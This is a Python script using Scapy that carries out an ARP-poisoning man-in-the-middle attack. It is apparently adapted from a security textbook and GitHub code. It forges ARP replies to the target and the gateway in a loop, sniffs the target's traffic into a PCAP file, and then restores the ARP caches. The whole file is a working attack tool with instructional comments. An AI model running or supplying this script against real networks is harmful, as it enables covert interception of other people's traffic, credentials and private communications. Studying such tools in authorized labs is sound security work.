#!/usr/bin/env python
#! -*- coding: utf-8 -*-

# --- This code has been slightly modified based on GitHub sources in order
# to make it work better than the original version from the book. ---

from scapy.all import *
import os
import sys
import threading
import signal

interface = "wlp63s0" # Change this according to local network config
target_ip = "192.168.1.33" # Change this according to local network config
gateway_ip = "192.168.1.1" # Change this according to local network config
packet_count = 100
poisoning = True

# Set our interface
conf.iface = interface

# Turn off the ouput
conf.verb = 0

# Our restore_target() function simply sends out
# the appropriate ARP packets to the network
# broadcast address to reset the ARP caches of
# the gateway and target machines.
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
	# Slightly different method using send
	print("[*] Restoring target to pre-attack status...")
	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac), count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
	print("[*] Target restored.")

# Our get_mac() function is responsible for using the srp
# (send and receive packet) function to emit an ARP request
# to the specified IP address in order to resolve the
# MAC address associated with it.
def get_mac(ip_address):
	response, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2, retry=10)

	# Return the MAC address from a response
	for s,r in response:
		return r[Ether].src

	return None

# Our poison_target function builds up ARP requests
# for poisoning both the target IP and the gateway.
# By poisoning both the gateway and the target IP
# address, we can see traffic flowing in and out of
# the target. We keep emitting these ARP requests
# in a loop to make sure that the respective ARP
# cache entries remain poisoned for the duration of our attack.
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	global poisoning

	poison_target = ARP() # So basically we forge an ARP packet that simulates
	poison_target.op = 2  # coming from the gateway_ip (psrc) but has our MAC in the header
	poison_target.psrc = gateway_ip # and is sent to the target, making it think our MAC is associated with the gateway IP
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac

	poison_gateway = ARP()  # Here we do the opposite, we forge an ARP packet that simulates
	poison_gateway.op = 2   # coming from the target_ip (psrc) but has our MAC in the header
	poison_gateway.psrc = target_ip # and is sent to the gateway, making it think our MAC is associated with the target IP
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac

	print("[*] Beginning the ARP poisoning. [Press CTRL-C to stop]")

	# Send the ARP poisoning messages continuously
	while poisoning:
		send(poison_target)
		send(poison_gateway)
		time.sleep(2)

	print("[*] APR poison attack finished.")

	return

print("[*] Setting up interface %s" % interface)

# Get the gateway MAC address
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
	print("[!!] Failed to get Gateway MAC. Abort mission.")
	sys.exit(0)
else:
	print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

# Get the target MAC address
target_mac = get_mac(target_ip)

if target_mac is None:
	print("[!!] Failed to get Target MAC. Abort mission.")
	sys.exit(0)
else:
	print("[*] Target %s is at %s" % (target_ip, target_mac))

# Start the victim poisoning with poison_target()
poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
	print("[*] Starting sniffer for %d packets" % packet_count)

	# We start up a sniffer that will capture
	# a preset amount of packets using a BPF
	# filter to only capture traffic for our
	# target IP address
	bpf_filter = "ip host %s" % target_ip
	packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

except KeyboardInterrupt:
    pass

finally:
	# When all of the packets have been captured,
	# we write them out to a PCAP file so that we
	# can reopen them later in Wireshark or use them
	# in a later script.
	print("[*] Writing packets to arper.pcap")
	wrpcap('arper.pcap',packets)
	print("[*] PCAP file saved.")

	# When the attack is finished, we put the network
	# back to the way it was before the ARP poisoning
	# took place.

    # Get the poison thread to stop
	poisoning = False

    # Wait for poisoning thread to exit
	poison_thread.join()
	print("Poison Thread closed")

    # Restore the network
	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
	sys.exit(0)
